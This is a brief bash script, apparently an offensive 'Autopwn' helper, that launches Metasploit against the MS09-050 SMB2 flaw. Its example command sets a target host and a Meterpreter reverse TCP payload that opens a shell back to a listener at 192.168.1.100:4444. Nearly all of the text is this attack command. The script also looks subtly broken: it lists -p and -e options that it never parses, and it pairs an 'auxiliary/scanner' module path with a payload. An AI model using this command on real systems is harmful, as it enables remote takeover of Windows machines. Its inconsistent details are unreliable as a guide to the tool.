#!/bin/bash
# Metasploit - Autopwn script
# Options:
# -p : Specify the payload
# -e : Specify the encoder

# Usage: msfconsole -x "use auxiliary/scanner/ms09_050_smb2_negotiate_func_index; set RHOSTS <target_ip>; set PAYLOAD <payload>; set LHOST <local_ip>; set LPORT <local_port>; exploit"

# Example script
msfconsole -x "use auxiliary/scanner/ms09_050_smb2_negotiate_func_index; set RHOSTS 192.168.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
